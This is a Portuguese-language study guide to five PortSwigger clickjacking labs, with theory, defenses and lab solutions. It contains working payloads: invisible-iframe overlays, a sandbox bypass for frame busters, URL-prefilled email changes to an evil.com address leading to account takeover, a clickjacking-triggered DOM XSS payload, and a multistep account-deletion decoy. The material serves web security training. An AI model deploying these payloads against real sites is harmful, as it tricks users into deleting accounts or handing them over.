# Clickjacking — PortSwigger Labs

> **UI Redressing** · **CSRF bypass** · **Frame busting** · **DOM XSS chaining**

---

## Índice

| Nível | Lab |
|---|---|
| 🟢 Apprentice | [Basic clickjacking with CSRF token protection](#lab-1-basic-clickjacking-with-csrf-token-protection) |
| 🟢 Apprentice | [Clickjacking with form input data prefilled from a URL parameter](#lab-2-clickjacking-with-form-input-prefilled-from-url-parameter) |
| 🟢 Apprentice | [Clickjacking with a frame buster script](#lab-3-clickjacking-with-a-frame-buster-script) |
| 🟡 Practitioner | [Exploiting clickjacking vulnerability to trigger DOM-based XSS](#lab-4-exploiting-clickjacking-to-trigger-dom-based-xss) |
| 🟡 Practitioner | [Multistep clickjacking](#lab-5-multistep-clickjacking) |

---

## Teoria

### O que é Clickjacking?

Clickjacking (também chamado *UI Redressing*) é um ataque onde a vítima é enganada a clicar num elemento invisível de uma página legítima, ao sobrepor um `<iframe>` transparente sobre uma interface decoy visível.

Ao contrário do CSRF, o clique é **genuíno** — o browser considera-o legítimo porque o utilizador clicou de facto. O ataque explora a **confiança visual**, não a autenticação.

```
┌──────────────────────────────────────┐
│        Página do atacante            │
│                                      │
│  ┌──────────────────────────────┐    │
│  │  iframe transparente         │    │
│  │  (opacity ≈ 0)               │    │
│  │                              │    │
│  │  [Botão real: DELETE ACCOUNT]│    │  ← z-index: 2 (em cima)
│  │                              │    │
│  └──────────────────────────────┘    │
│                                      │
│  [Botão decoy: CLICA AQUI!]          │  ← z-index: 1 (por baixo)
│                                      │
└──────────────────────────────────────┘
         ↑ Vítima vê e clica aqui
         ↓ Clique aterra aqui em cima (iframe)
```

### CSS Crítico

```css
/* iframe: invisível mas clicável */
#iframe-alvo {
    position: relative;
    width: 800px;
    height: 600px;
    opacity: 0.0001;   /* NUNCA 0 — tem de ser renderizado para ser clicável */
    z-index: 2;        /* POR CIMA do decoy */
}

/* decoy: visível, por baixo */
#decoy {
    position: absolute;
    z-index: 1;        /* POR BAIXO do iframe */
    top: 505px;        /* alinhar com o botão real */
    left: 50px;
}
```

> **Porquê `opacity: 0.0001` e não `0`?**
> Com `opacity: 0` o browser pode omitir o elemento do layout/eventos. `0.0001` é suficientemente invisível mas garante que o clique é captado.

---

### Anatomia do Ataque

```
Atacante prepara exploit:
─────────────────────────
1. Cria página HTML com iframe apontando ao site alvo
2. Posiciona botão decoy por baixo do botão alvo
3. Define opacity ≈ 0 no iframe

Vítima visita a exploit page:
──────────────────────────────
4. Vítima vê o botão decoy ("Ganhou um prémio!")
5. Vítima clica
6. Clique vai para o iframe (site legítimo)
7. Ação sensível executada com sessão da vítima

Resultado:
──────────
✓ Conta apagada / email alterado / ação completada
✓ CSRF token válido (usou a sessão real)
✓ Vítima não percebeu nada
```

---

### CSRF tokens NÃO protegem contra Clickjacking

```
CSRF Protection:
  ✓ Valida que o pedido veio do mesmo origem
  ✗ Não impede que a página seja carregada num iframe
  ✗ Não impede que o utilizador clique sem saber

Clickjacking bypass:
  → O iframe carrega a página legítima (com CSRF token válido)
  → O clique da vítima submete o form COM o token correto
  → O servidor aceita (token válido + sessão válida)
```

---

### Defesas Eficazes

| Defesa | Como funciona | Contorna Clickjacking? |
|---|---|---|
| `X-Frame-Options: DENY` | Browser recusa renderizar em iframe | ✅ Sim |
| `X-Frame-Options: SAMEORIGIN` | Só permite iframes do mesmo domínio | ✅ Sim |
| `Content-Security-Policy: frame-ancestors 'none'` | Substituto moderno do X-Frame-Options | ✅ Sim |
| CSRF tokens | Valida origem dos pedidos | ❌ Não |
| Frame buster scripts (JS) | JS tenta sair do iframe | ⚠️ Bypassável via `sandbox` |

---

### Frame Buster Scripts — e como contorná-los

```javascript
// Defesa típica (frame buster):
if (top !== self) {
    top.location = self.location;  // tenta redirecionar para fora
}
```

```html
<!-- Bypass: atributo sandbox desativa o JavaScript -->
<iframe src="https://alvo.com" sandbox="allow-forms">
    <!--
        sandbox bloqueia:  ✓ JavaScript (frame buster neutralizado)
        sandbox permite:   ✓ Submissão de forms (com allow-forms)
    -->
</iframe>
```

```
Porquê sandbox funciona:
─────────────────────────
  sandbox sem allow-scripts → iframe não pode executar JS
  frame buster é JS → não executa → não consegue sair
  allow-forms mantém → form pode ser submetido
  
  Resultado: clickjacking funciona mesmo com frame buster
```

---

### Prefill via URL Parameter

Algumas aplicações aceitam parâmetros GET para pré-preencher formulários:

```
https://alvo.com/minha-conta?email=atacante@evil.com
                              ↑
                Atacante controla este valor
```

```html
<!-- O iframe carrega o form já preenchido com o email do atacante -->
<iframe src="https://alvo.com/minha-conta?email=atacante@evil.com"
        style="opacity:0.0001; z-index:2; position:relative;">
</iframe>

<!-- Decoy posicionado sobre o botão "Update email" -->
<div style="position:absolute; top:440px; left:80px; z-index:1;">
    <button>Clica aqui para ganhar!</button>
</div>
```

```
Fluxo:
  1. Vítima visita exploit page
  2. iframe carrega /minha-conta com email=atacante@evil.com pré-preenchido
  3. Vítima clica no decoy → clique vai para "Update email" no iframe
  4. Email da conta atualizado para o email do atacante
  5. Atacante faz reset de password → conta comprometida
```

---

### Clickjacking + DOM XSS (chaining)

```
Ataque simples:        Clickjacking → ação sensível

Ataque encadeado:      Clickjacking → submissão de form
                                          ↓
                                    form tem campo com XSS sink
                                          ↓
                                    XSS executa no contexto da vítima
```

```html
<!-- Payload XSS injetado via URL parameter -->
<iframe src="https://alvo.com/feedback?name=<img src=1 onerror=print()>&email=x@x.com">
</iframe>

<!--
Porquê funciona:
  1. O parâmetro name vai para um DOM XSS sink
  2. Normalmente precisaria que a vítima submetesse o form
  3. Clickjacking força a vítima a clicar em "Submit"
  4. XSS executa → cookies, redirecionamentos, ações
-->
```

---

### Multistep Clickjacking

Algumas ações críticas têm confirmação em dois passos:

```
Fluxo normal do site:
  [Delete account] → modal "Tem a certeza?" → [Yes, delete]

Clickjacking multistep:
  ┌─────────────────────────────────────────┐
  │  Decoy 1: "Clica aqui"                  │  → captura clique em "Delete account"
  │  Decoy 2: "Confirma a tua idade"        │  → captura clique em "Yes, delete"
  └─────────────────────────────────────────┘
  
  Engenharia social: "Completa estes dois passos para reclamar o prémio"
  Resultado: conta apagada com dois cliques aparentemente inocentes
```

```html
<!-- Dois decoys para dois cliques -->
<div style="position:absolute; top:505px; left:50px; z-index:1;">
    <button>Passo 1: Clica aqui</button>
</div>
<div style="position:absolute; top:295px; left:215px; z-index:1;">
    <button>Passo 2: Confirmar</button>
</div>
<iframe src="https://alvo.com/minha-conta"
        style="opacity:0.0001; z-index:2; position:relative;">
</iframe>
```

---

## Lab 1: Basic clickjacking with CSRF token protection

🔗 [https://portswigger.net/web-security/clickjacking/lab-basic-csrf-protected](https://portswigger.net/web-security/clickjacking/lab-basic-csrf-protected)

**Objetivo:** Induzir a vítima a clicar em "Delete account" mesmo com proteção CSRF.

**Conceito chave:** CSRF tokens validam pedidos, não impedem UI redressing.

**Payload:**

```html
<html>
<head>
    <style>
        #target_website {
            position: relative;
            width: 800px;
            height: 600px;
            opacity: 0.0001;
            z-index: 2;
        }
        #decoy_website {
            position: absolute;
            width: 300px;
            height: 400px;
            z-index: 1;
            top: 505px;
            left: 50px;
        }
    </style>
</head>
<body>
    <div id="decoy_website">
        <button class="button" type="submit">Click me</button>
    </div>
    <iframe id="target_website" src="LABID.web-security-academy.net/my-account">
    </iframe>
</body>
</html>
```

**Script Python (`basic-crsf_protected.py`):**

```python
payload = f"""
<html>
<head>
    <style>
        #target_website {{
            position: relative;
            width: 800px;
            height: 600px;
            opacity: 0.0001;
            z-index: 2;
        }}
        #decoy_website {{
            position: absolute;
            width: 300px;
            height: 400px;
            z-index: 1;
            top: 505px;
            left: 50px;
        }}
    </style>
</head>
<body>
    <div id="decoy_website">
        <button class="button" type="submit"> Click me </button>
    </div>
    <iframe id="target_website" src="{blog.base_url}my-account">
    </iframe>
</body>
</html>
"""
blog.post_exploit(response_body=payload)
blog.is_solved()
```

---

## Lab 2: Clickjacking with form input prefilled from URL parameter

🔗 [https://portswigger.net/web-security/clickjacking/lab-prefilled-form-input](https://portswigger.net/web-security/clickjacking/lab-prefilled-form-input)

**Objetivo:** Alterar o email da vítima usando pré-preenchimento por URL parameter.

**Payload:**

```html
<iframe src="https://LABID.web-security-academy.net/my-account?email=hacker@evil.com"
        style="position:relative; width:800px; height:600px;
               opacity:0.0001; z-index:2;">
</iframe>
<div style="position:absolute; top:440px; left:80px; z-index:1;">
    <button>Click me</button>
</div>
```

**Nota:** Ajustar `top`/`left` para alinhar com o botão "Update email" na página alvo.

---

## Lab 3: Clickjacking with a frame buster script

🔗 [https://portswigger.net/web-security/clickjacking/lab-frame-buster-script](https://portswigger.net/web-security/clickjacking/lab-frame-buster-script)

**Objetivo:** Contornar defesa JavaScript anti-framing.

**Diferença chave:** Adicionar `sandbox="allow-forms"` ao iframe.

```html
<iframe id="target_website"
        src="https://LABID.web-security-academy.net/my-account"
        sandbox="allow-forms"
        style="position:relative; width:800px; height:600px;
               opacity:0.0001; z-index:2;">
</iframe>
<div style="position:absolute; top:505px; left:50px; z-index:1;">
    <button>Click me</button>
</div>
```

**Porquê funciona:**
- `sandbox` desativa JavaScript por default → frame buster não executa
- `allow-forms` mantém a capacidade de submeter forms
- Resultado: iframe carrega normalmente, clickjacking funciona

---

## Lab 4: Exploiting clickjacking to trigger DOM-based XSS

🔗 [https://portswigger.net/web-security/clickjacking/lab-exploiting-to-trigger-dom-based-xss](https://portswigger.net/web-security/clickjacking/lab-exploiting-to-trigger-dom-based-xss)

**Objetivo:** Encadear clickjacking com DOM XSS para executar JavaScript.

**Payload:**

```html
<iframe
    src="https://LABID.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=x@x.com&subject=x&message=x"
    style="position:relative; width:800px; height:600px;
           opacity:0.0001; z-index:2;">
</iframe>
<div style="position:absolute; top:610px; left:80px; z-index:1;">
    <button>Click me</button>
</div>
```

**Nota:** Verificar encoding do payload XSS e ajustar `top` para alinhar com "Submit feedback".

---

## Lab 5: Multistep clickjacking

🔗 [https://portswigger.net/web-security/clickjacking/lab-multistep](https://portswigger.net/web-security/clickjacking/lab-multistep)

**Objetivo:** Completar um fluxo de dois cliques (Delete → Confirm).

**Payload:**

```html
<div style="position:absolute; top:505px; left:50px; z-index:1;">
    <button>Click me first</button>
</div>
<div style="position:absolute; top:295px; left:215px; z-index:1;">
    <button>Click me next</button>
</div>
<iframe id="target_website"
        src="https://LABID.web-security-academy.net/my-account"
        style="position:relative; width:800px; height:600px;
               opacity:0.0001; z-index:2;">
</iframe>
```

**Dica de tuning:** Usar `opacity: 0.5` temporariamente para ver o iframe e ajustar posições.

---

## Dicas Gerais

### Tuning de posição

```
1. Definir opacity: 0.5 no iframe (ver os dois layers sobrepostos)
2. Usar DevTools para inspecionar posição do botão alvo
3. Ajustar top/left no decoy até alinhar
4. Definir opacity: 0.0001 no payload final
```

### Estrutura do exploit server

```
[Exploit Server] → host o HTML malicioso
       ↓
[Vítima visita a URL do exploit]
       ↓
[Vítima clica no decoy] → clique vai para o iframe
       ↓
[Ação executada no site legítimo com sessão da vítima]
```

### Referências

- [PortSwigger: Clickjacking](https://portswigger.net/web-security/clickjacking)
- [OWASP: Clickjacking Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)